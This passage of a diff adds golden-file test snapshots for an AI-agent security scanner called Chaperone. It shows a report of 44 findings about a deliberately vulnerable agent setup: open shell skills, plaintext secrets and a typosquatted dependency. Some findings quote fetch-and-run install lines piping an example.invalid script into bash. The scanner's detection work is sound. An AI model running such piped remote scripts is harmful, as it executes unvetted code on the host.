+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-NET-001%3A Gateway bound beyond localhost::The gateway is bound to '0.0.0.0', not localhost, making it reachable from other hosts on the network.
+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-NET-002%3A Missing or weak auth on the gateway control API::The gateway's control API has weak authentication: the auth token is empty or a common default value.
+::warning file=<TARGET_ROOT>/config.yaml,title=CHAP-NET-003%3A Plaintext transport on the gateway::The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext.
+::warning file=<TARGET_ROOT>/config.yaml,title=CHAP-OBS-001%3A No audit log of agent actions::Logging is configured but the audit log of tool invocations/actions is disabled.
+::warning file=<TARGET_ROOT>/logs/agent.log,title=CHAP-OBS-002%3A Sensitive data in plaintext logs::Logging config does not confirm secrets/message bodies are redacted before being written to logs.
+::notice file=<TARGET_ROOT>,title=CHAP-OBS-003%3A No documented kill switch / revocation path::No documented quick way to stop the agent and revoke its access was found at the install root.
+::warning file=<TARGET_ROOT>/memory,title=CHAP-OBS-004%3A Persistent memory/state store exposed::The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.
+::notice::Chaperone scan: 44 findings found."
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden html output 1`] = `
+"<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chaperone scan report</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1f2937; background: #ffffff; line-height: 1.5; }
+  h1 { margin-bottom: 0.25rem; }
+  .meta { color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem; }
+  .summary { background: #f3f4f6; border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 2rem; }
+  .summary .score { font-size: 1.5rem; font-weight: 700; }
+  .not-resolved { background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 1.5rem; }
+  .severity-group { margin-bottom: 2rem; }
+  .finding { border-left: 4px solid; background: #f9fafb; border-radius: 4px; padding: 0.75rem 1rem; margin-bottom: 0.75rem; }
+  .finding h3 { margin: 0 0 0.4rem; font-size: 1rem; }
+  .check-id { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; color: #6b7280; font-weight: 400; }
+  .finding p { margin: 0.25rem 0; font-size: 0.92rem; }
+  .location code, .skipped code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+  .no-findings { color: #059669; font-weight: 600; }
+  .skipped ul { padding-left: 1.25rem; }
+  .skipped li { font-size: 0.9rem; color: #6b7280; }
+</style>
+</head>
+<body>
+<h1>Chaperone scan report</h1>
+<p class="meta">Target: <code><TARGET_ROOT></code><br>
+Scanned at <TIMESTAMP> — chaperone v0.1.0</p>
+
+<div class="summary">
+  <div class="score">Posture score: 0/100 (F)</div>
+  <div>44 findings — 5 critical, 20 high, 18 medium, 1 low, 0 info</div>
+  <div>Inspected 18 paths, skipped 0.</div>
+</div>
+<section class="severity-group severity-critical">
+  <h2 style="color: #7f1d1d">Critical (5)</h2>
+  <article class="finding" style="border-left-color: #7f1d1d">
+  <h3><span class="check-id">CHAP-AGY-001</span> Unrestricted shell execution</h3>
+  <p class="message">Skill &#39;command-relay&#39; can execute arbitrary shell commands with no detected command allowlist or confirmation gate.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.</p>
+</article>
+<article class="finding" style="border-left-color: #7f1d1d">
+  <h3><span class="check-id">CHAP-AGY-001</span> Unrestricted shell execution</h3>
+  <p class="message">Skill &#39;py-cache-cleaner&#39; can execute arbitrary shell commands with no detected command allowlist or confirmation gate.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.</p>
+</article>
+<article class="finding" style="border-left-color: #7f1d1d">
+  <h3><span class="check-id">CHAP-AGY-001</span> Unrestricted shell execution</h3>
+  <p class="message">Skill &#39;shell-runner&#39; can execute arbitrary shell commands with no detected command allowlist or confirmation gate.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.</p>
+</article>
+<article class="finding" style="border-left-color: #7f1d1d">
+  <h3><span class="check-id">CHAP-SUP-005</span> Obfuscated or dynamically-evaluated code</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Avoid dynamic code evaluation entirely; if truly needed, review the exact string being evaluated by hand and vendor/pin it rather than constructing it at runtime.</p>
+</article>
+<article class="finding" style="border-left-color: #7f1d1d">
+  <h3><span class="check-id">CHAP-NET-001</span> Gateway bound beyond localhost</h3>
+  <p class="message">The gateway is bound to &#39;0.0.0.0&#39;, not localhost, making it reachable from other hosts on the network.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (gateway.host)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06 / general</p>
+  <p class="remediation"><strong>Remediation:</strong> Bind the gateway to 127.0.0.1/localhost; put anything that must be remote behind a tunnel with authentication.</p>
+</article>
+</section>
+<section class="severity-group severity-high">
+  <h2 style="color: #b91c1c">High (20)</h2>
+  <article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SEC-001</span> Plaintext secrets in config</h3>
+  <p class="message">Config field &#39;llm.api_key&#39; holds a literal secret value (sk-…wxyz) instead of an environment-variable reference.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml:6 (llm.api_key)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR).</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SEC-001</span> Plaintext secrets in config</h3>
+  <p class="message">Config field &#39;channels.telegram.bot_token&#39; holds a literal secret value (123…AA11) instead of an environment-variable reference.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml:11 (channels.telegram.bot_token)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR).</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SEC-002</span> Secrets in a git-tracked path</h3>
+  <p class="message">The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (config.yaml)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Add the config/secret file to .gitignore, and rotate any key that may already have been committed.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SEC-005</span> Secret already present in existing log content</h3>
+  <p class="message">A secret-shaped value for &#39;api_key&#39; (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/logs/agent.log (api_key)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Rotate the leaked credential, purge or redact the log file, and fix the logging behavior that caused it to be written (see CHAP-SEC-004/CHAP-OBS-002).</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SEC-006</span> Sidecar secret file exposed</h3>
+  <p class="message">Sidecar secret file &#39;secrets.yaml&#39; holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/secrets.yaml (yaml)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Add the file to .gitignore, rotate any key that may already have been committed, and restrict it to owner-only access (chmod 600).</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-AGY-002</span> Unrestricted filesystem access</h3>
+  <p class="message">Skill &#39;file-writer&#39; writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/file-writer/package.json (file-writer)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Scope the skill&#39;s file access to a dedicated workspace directory and deny path traversal outside it.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-AGY-003</span> Destructive action without confirmation</h3>
+  <p class="message">Skill &#39;file-writer&#39; can perform a destructive/irreversible action (delete) with no declared confirmation gate.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/file-writer/package.json (file-writer)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-AGY-003</span> Destructive action without confirmation</h3>
+  <p class="message">Skill &#39;py-cache-cleaner&#39; can perform a destructive/irreversible action (delete) with no declared confirmation gate.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;command-relay&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;file-writer&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/file-writer/package.json (file-writer)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;py-cache-cleaner&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;shell-runner&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-001</span> Skill from an unverified source</h3>
+  <p class="message">Skill &#39;web-fetcher&#39; is not installed at a pinned version/commit (unpinned).</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-SUP-003</span> Known-vulnerable dependency</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone&#39;s offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: &quot;Command Injection in lodash&quot; (high), fixed in 4.17.21.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (lodash@^4.17.15)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Upgrade lodash to 4.17.21 or later.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-INJ-001</span> Untrusted input flows straight to the model</h3>
+  <p class="message">At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (trust.mark_untrusted_input)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM01: Prompt Injection</p>
+  <p class="remediation"><strong>Remediation:</strong> Mark untrusted inbound content explicitly and keep it separated from system instructions in the prompt; filter before forwarding it to the model.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-INJ-002</span> Tool output treated as trusted</h3>
+  <p class="message">Skill &#39;command-relay&#39; traces a network/filesystem result directly into a shell-exec call&#39;s argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM02: Insecure Output Handling</p>
+  <p class="remediation"><strong>Remediation:</strong> Validate/escape a tool&#39;s output before it can drive another tool; never auto-execute model or tool output.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-INJ-003</span> Actions triggerable by inbound messages without an allowlist</h3>
+  <p class="message">At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (trust.tool_allowlist)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM01: Prompt Injection / LLM08: Excessive Agency</p>
+  <p class="remediation"><strong>Remediation:</strong> Restrict which tools each channel/sender can invoke with an explicit allowlist.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-INJ-004</span> Auto-execution of links/commands from messages</h3>
+  <p class="message">Config auto-executes links/commands found in inbound messages with no confirmation step.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (trust.auto_execute_links)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM01: Prompt Injection</p>
+  <p class="remediation"><strong>Remediation:</strong> Disable auto-execution of links/commands found in messages; require explicit confirmation instead.</p>
+</article>
+<article class="finding" style="border-left-color: #b91c1c">
+  <h3><span class="check-id">CHAP-NET-002</span> Missing or weak auth on the gateway control API</h3>
+  <p class="message">The gateway&#39;s control API has weak authentication: the auth token is empty or a common default value.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (gateway.auth.token)</p>
+  <p class="owasp"><strong>OWASP:</strong> General</p>
+  <p class="remediation"><strong>Remediation:</strong> Require a strong, randomly-generated token for the gateway control API and rotate any default value.</p>
+</article>
+</section>
+<section class="severity-group severity-medium">
+  <h2 style="color: #b45309">Medium (18)</h2>
+  <article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SEC-003</span> Overly permissive file permissions</h3>
+  <p class="message">The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (mode 644)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Restrict the file to owner-only access, e.g. \`chmod 600\` the config file (and \`chmod 700\` its directory).</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SEC-004</span> Secrets likely to reach logs</h3>
+  <p class="message">Secrets are likely to reach logs: log level &#39;debug&#39; is verbose while literal secrets are configured; the log file is readable by group or other.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/logs/agent.log (logging)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Raise the log level away from debug/trace, redact secrets before logging, and restrict the log file to owner-only access.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-AGY-004</span> Broad network egress from a skill</h3>
+  <p class="message">Skill &#39;command-relay&#39; can call arbitrary external endpoints — no domain allowlist is declared.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency / LLM06</p>
+  <p class="remediation"><strong>Remediation:</strong> Allowlist the specific destination domain(s) this skill needs and log outbound calls.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-AGY-004</span> Broad network egress from a skill</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; can call arbitrary external endpoints — no domain allowlist is declared.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency / LLM06</p>
+  <p class="remediation"><strong>Remediation:</strong> Allowlist the specific destination domain(s) this skill needs and log outbound calls.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-AGY-004</span> Broad network egress from a skill</h3>
+  <p class="message">Skill &#39;web-fetcher&#39; can call arbitrary external endpoints — no domain allowlist is declared.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08: Excessive Agency / LLM06</p>
+  <p class="remediation"><strong>Remediation:</strong> Allowlist the specific destination domain(s) this skill needs and log outbound calls.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;command-relay&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;file-writer&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/file-writer/package.json (file-writer)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;py-cache-cleaner&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;shell-runner&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
+  <p class="message">Skill &#39;web-fetcher&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-004</span> Dangerous install pattern</h3>
+  <p class="message">Skill &#39;shell-runner&#39; install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall.</p>
+  <p class="location"><strong>Location:</strong> package.json#scripts.postinstall (shell-runner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-004</span> Dangerous install pattern</h3>
+  <p class="message">Skill &#39;shell-runner&#39; install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/shell-runner/install.sh (shell-runner)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-SUP-006</span> Typosquat-risk dependency name</h3>
+  <p class="message">Skill &#39;plugin-loader&#39; depends on &#39;reqeust&#39;, which is suspiciously close to the well-known package &#39;request&#39; — possible typosquat.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (reqeust)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
+  <p class="remediation"><strong>Remediation:</strong> Double check that &#39;reqeust&#39; is the package you actually intend to use, not a typosquat of &#39;request&#39;.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-NET-003</span> Plaintext transport on the gateway</h3>
+  <p class="message">The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (gateway.tls)</p>
+  <p class="owasp"><strong>OWASP:</strong> General</p>
+  <p class="remediation"><strong>Remediation:</strong> Enable TLS on the gateway and disable any plaintext fallback.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-OBS-001</span> No audit log of agent actions</h3>
+  <p class="message">Logging is configured but the audit log of tool invocations/actions is disabled.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/config.yaml (logging.audit.enabled)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM08-adjacent</p>
+  <p class="remediation"><strong>Remediation:</strong> Enable an append-only audit log of every tool invocation/action the agent takes.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-OBS-002</span> Sensitive data in plaintext logs</h3>
+  <p class="message">Logging config does not confirm secrets/message bodies are redacted before being written to logs.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/logs/agent.log (logging.redact_secrets)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Redact secrets and sensitive message content before logging, and restrict access to the log file.</p>
+</article>
+<article class="finding" style="border-left-color: #b45309">
+  <h3><span class="check-id">CHAP-OBS-004</span> Persistent memory/state store exposed</h3>
+  <p class="message">The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/memory (memory_dir)</p>
+  <p class="owasp"><strong>OWASP:</strong> LLM06: Sensitive Information Disclosure</p>
+  <p class="remediation"><strong>Remediation:</strong> Restrict the memory/state directory to owner-only access (chmod 700) and add it to .gitignore — it can accumulate sensitive conversational content over time.</p>
+</article>
+</section>
+<section class="severity-group severity-low">
+  <h2 style="color: #1d4ed8">Low (1)</h2>
+  <article class="finding" style="border-left-color: #1d4ed8">
+  <h3><span class="check-id">CHAP-OBS-003</span> No documented kill switch / revocation path</h3>
+  <p class="message">No documented quick way to stop the agent and revoke its access was found at the install root.</p>
+  <p class="location"><strong>Location:</strong> <TARGET_ROOT> (KILL_SWITCH.md / STOP.md / kill-switch.sh / revoke.sh)</p>
+  <p class="owasp"><strong>OWASP:</strong> General</p>
+  <p class="remediation"><strong>Remediation:</strong> Document a kill switch (how to stop the agent) and a script or checklist to revoke/rotate its credentials.</p>
+</article>
+</section>
+
+</body>
+</html>
+"
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden json output 1`] = `
+"{
+  "tool": {
+    "name": "chaperone",
+    "version": "0.1.0"
+  },
+  "target": "<TARGET_ROOT>",
+  "targetRootResolved": true,
+  "timestamp": "<TIMESTAMP>",
+  "summary": {
+    "totalFindings": 44,
+    "bySeverity": {
+      "critical": 5,
+      "high": 20,
+      "medium": 18,
+      "low": 1,
+      "info": 0
+    },
+    "score": 0,
+    "band": "F"
+  },
+  "findings": [
+    {
+      "checkId": "CHAP-SEC-001",
+      "title": "Plaintext secrets in config",
+      "severity": "high",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
